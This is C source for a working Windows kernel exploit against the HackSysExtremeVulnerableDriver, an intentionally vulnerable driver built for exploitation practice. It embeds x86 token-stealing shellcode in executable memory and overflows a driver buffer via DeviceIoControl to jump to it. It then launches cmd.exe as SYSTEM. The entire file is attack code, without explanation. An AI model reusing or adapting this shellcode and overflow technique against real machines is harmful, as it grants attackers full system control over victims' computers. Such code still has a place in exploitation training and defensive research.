#include <stdio.h>
#include <Windows.h>

#define IO_CODE 0x222003

int main(void) {
	printf("[+] Calling CreateFileA() to obtain a handle to the driver..\n");
	HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000,
		0, NULL, 0x3, 0, NULL);

	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("[-] Error - Unable to obtain a handle to the driver..\n");
		exit(-1);
	}

	printf("[+] Successfully obtained a handle to the driver..\n");

	char payload[] =
		"\x60"
		"\x31\xc0"
		"\x64\x8b\x80\x24\x01\x00\x00"
		"\x8b\x40\x50"
		"\x89\xc1"
		"\xba\x04\x00\x00\x00"
		"\x8b\x80\xb8\x00\x00\x00"
		"\x2d\xb8\x00\x00\x00"
		"\x39\x90\xb4\x00\x00\x00"
		"\x75\xed"
		"\x8b\x90\xf8\x00\x00\x00"
		"\x89\x91\xf8\x00\x00\x00"
		"\x61"
		"\x31\xc0"
		"\x5d"
		"\xc2\x08\x00";

	LPVOID Alloc = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!Alloc) {
		printf("[-] Error - Unable to allocate shellcode.\n");
		exit(-1);
	}

	printf("[+] Succesfully created executable memory region for tokenstealing shellcode at : 0x%x\n", Alloc);

	RtlMoveMemory(Alloc, payload, sizeof(payload));
	printf("[+] Copied tokenstealing shellcode to the executable memory region..\n");

	DWORD bytesRetn;

	char expl[0x824] = { 0 };
	memset(expl, 'A', sizeof(expl));

	size_t offset = 2080;
	memcpy(&expl[offset], &Alloc, 0x4);

	printf("[+] Staring interaction with the driver..\n");
	DeviceIoControl(hDevice, IO_CODE, expl, sizeof(expl), NULL, 0, &bytesRetn, NULL);
	system("cmd.exe");

	CloseHandle(hDevice);

	return 0;
}